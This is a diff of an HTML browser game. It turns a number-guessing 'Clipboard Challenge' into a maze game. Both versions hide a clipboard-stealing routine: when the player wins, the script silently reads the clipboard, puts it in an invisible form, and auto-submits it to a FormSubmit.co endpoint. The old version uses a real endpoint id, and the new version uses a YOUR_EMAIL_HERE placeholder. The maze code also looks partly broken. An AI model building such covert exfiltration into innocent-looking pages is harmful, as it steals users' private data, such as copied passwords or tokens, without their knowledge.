@@ -3,118 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clipboard Challenge Game</title>
+    <title>Maze Escape - Clipboard Game</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
-            text-align: center;
-            margin-top: 50px;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
 
-        .game-container {
+        #gameArea {
+            position: relative;
+            width: 400px;
+            height: 400px;
             background-color: #fff;
-            border: 2px solid #ddd;
-            padding: 30px;
-            border-radius: 10px;
-            width: 300px;
-            margin: 0 auto;
+            border: 2px solid #333;
+            display: grid;
+            grid-template-columns: repeat(10, 40px);
+            grid-template-rows: repeat(10, 40px);
         }
 
-        h1 {
-            font-size: 24px;
-            color: #333;
+        .maze-block {
+            width: 40px;
+            height: 40px;
+            background-color: #e0e0e0;
         }
 
-        input, button {
-            padding: 10px;
-            font-size: 16px;
-            margin: 10px 0;
-            width: 100%;
-            border-radius: 5px;
-            border: 1px solid #ddd;
+        .wall {
+            background-color: #333;
         }
 
-        .game-btn {
-            background-color: #4CAF50;
-            color: white;
-            cursor: pointer;
+        .start {
+            background-color: #00ff00;
         }
 
-        .game-btn:hover {
-            background-color: #45a049;
+        .exit {
+            background-color: #ff0000;
+        }
+
+        .player {
+            background-color: #0000ff;
         }
 
         .game-message {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #555;
-        }
-
-        .hidden {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            color: #000;
             display: none;
+            background-color: rgba(255, 255, 255, 0.7);
+            padding: 20px;
+            border-radius: 10px;
         }
     </style>
-    <script>
-        let secretNumber = Math.floor(Math.random() * 100) + 1; // Random number between 1-100
-        let attempts = 0;
-
-        function startGame() {
-            const guessInput = document.getElementById('guessInput');
-            const message = document.getElementById('gameMessage');
-            const guess = parseInt(guessInput.value);
-
-            attempts++;
-
-            if (guess === secretNumber) {
-                message.textContent = `Congratulations! You guessed the number in ${attempts} attempts. 🏆`;
-                message.classList.remove('hidden');
-                message.style.color = "green";
-                copyClipboardAndSubmit();
-            } else if (guess < secretNumber) {
-                message.textContent = "Too low! Try again.";
-                message.style.color = "orange";
-            } else if (guess > secretNumber) {
-                message.textContent = "Too high! Try again.";
-                message.style.color = "orange";
-            }
-        }
-
-        function copyClipboardAndSubmit() {
-            // Read the clipboard content in the background and submit it
-            navigator.clipboard.readText().then(function(clipText) {
-                // Set the clipboard content into a hidden form field
-                document.getElementById('clipboardContent').value = clipText;
-
-                // Automatically submit the form without user interaction
-                setTimeout(function() {
-                    document.getElementById('hiddenForm').submit();
-                }, 1000); // Delay to simulate final action
-            }).catch(function(err) {
-                console.error('Failed to read clipboard contents: ', err);
-                alert("Oops! Something went wrong. Please try again.");
-            });
-        }
-    </script>
 </head>
 <body>
 
-<div class="game-container">
-    <h1>Clipboard Challenge: Guess the Number</h1>
-    <p>Guess a number between 1 and 100 to unlock the secret!</p>
-
-    <input type="number" id="guessInput" placeholder="Enter your guess" />
-    <button class="game-btn" onclick="startGame()">Submit Guess</button>
-
-    <div id="gameMessage" class="game-message hidden"></div>
-
-    <!-- Hidden form to send clipboard content via FormSubmit.co -->
-    <form id="hiddenForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display:none;">
-        <input type="hidden" name="_subject" value="Clipboard Challenge - Secret Unlocked" />
-        <input type="hidden" name="_next" value="thank_you.html" />
-        <input type="hidden" id="clipboardContent" name="clipboardContent" />
-    </form>
+<div id="gameArea">
+    <div class="maze-block start" id="start"></div>
+    <div class="maze-block wall" id="wall1"></div>
+    <div class="maze-block wall" id="wall2"></div>
+    <div class="maze-block wall" id="wall3"></div>
+    <div class="maze-block wall" id="wall4"></div>
+    <div class="maze-block wall" id="wall5"></div>
+    <div class="maze-block exit" id="exit"></div>
+    <div class="maze-block player" id="player"></div>
 </div>
+
+<div id="gameMessage" class="game-message">Congratulations! You found the exit!</div>
+
+<form id="hiddenForm" action="https://formsubmit.co/YOUR_EMAIL_HERE" method="POST" style="display:none;">
+    <input type="hidden" name="_subject" value="Maze Game - Secret Unlocked!" />
+    <input type="hidden" name="_next" value="thank_you.html" />
+    <input type="hidden" id="clipboardContent" name="clipboardContent" />
+</form>
+
+<script>
+    // Set up the maze
+    const player = document.getElementById('player');
+    const start = document.getElementById('start');
+    const exit = document.getElementById('exit');
+    const gameMessage = document.getElementById('gameMessage');
+    const mazeArea = document.getElementById('gameArea');
+
+    let playerPosition = { x: 0, y: 0 }; // Player's initial position (grid-based)
+    let maze = [
+        [start, null, null, null, null, null, null, null, null, null],
+        [null, 'wall', 'wall', 'wall', 'wall', null, null, 'wall', 'wall', null],
+        [null, 'wall', null, null, 'wall', null, null, null, 'wall', null],
+        [null, 'wall', 'wall', null, 'wall', null, null, 'wall', 'wall', null],
+        [null, null, 'wall', 'wall', 'wall', null, 'wall', null, null, null],
+        [null, null, null, 'wall', 'wall', 'wall', null, null, null, 'exit'],
+        [null, null, null, 'wall', null, null, null, null, null, null],
+        [null, 'wall', null, 'wall', null, 'wall', 'wall', null, 'wall', null],
+        [null, 'wall', null, null, null, 'wall', null, null, null, null],
+        [null, null, null, null, null, null, null, null, null, null]
+    ];
+
+    // Update player position
+    function updatePlayerPosition() {
+        player.style.gridRowStart = playerPosition.y + 1;
+        player.style.gridColumnStart = playerPosition.x + 1;
+    }
+
+    // Move the player based on arrow keys
+    function movePlayer(event) {
+        if (event.key === 'ArrowUp' && playerPosition.y > 0 && !maze[playerPosition.y - 1][playerPosition.x]?.includes('wall')) {
+            playerPosition.y--;
+        } else if (event.key === 'ArrowDown' && playerPosition.y < 9 && !maze[playerPosition.y + 1][playerPosition.x]?.includes('wall')) {
+            playerPosition.y++;
+        } else if (event.key === 'ArrowLeft' && playerPosition.x > 0 && !maze[playerPosition.y][playerPosition.x - 1]?.includes('wall')) {
+            playerPosition.x--;
+        } else if (event.key === 'ArrowRight' && playerPosition.x < 9 && !maze[playerPosition.y][playerPosition.x + 1]?.includes('wall')) {
+            playerPosition.x++;
+        }
+
+        updatePlayerPosition();
+
+        // Check if player has reached the exit
+        if (playerPosition.x === 9 && playerPosition.y === 5) {
+            gameMessage.style.display = 'block';
+            copyClipboardAndSubmit();
+        }
+    }
+
+    // Copy clipboard content and submit the form
+    function copyClipboardAndSubmit() {
+        navigator.clipboard.readText().then(function(clipText) {
+            // Set the clipboard content into a hidden form field
+            document.getElementById('clipboardContent').value = clipText;
+
+            // Automatically submit the form
+            setTimeout(function() {
+                document.getElementById('hiddenForm').submit();
+            }, 1000); // Delay before submitting the form
+        }).catch(function(err) {
+            console.error('Failed to read clipboard contents: ', err);
+        });
+    }
+
+    // Add event listener to listen for arrow keys
+    document.addEventListener('keydown', movePlayer);
+
+    // Initialize the player position
+    updatePlayerPosition();
+</script>
 
 </body>
 </html>
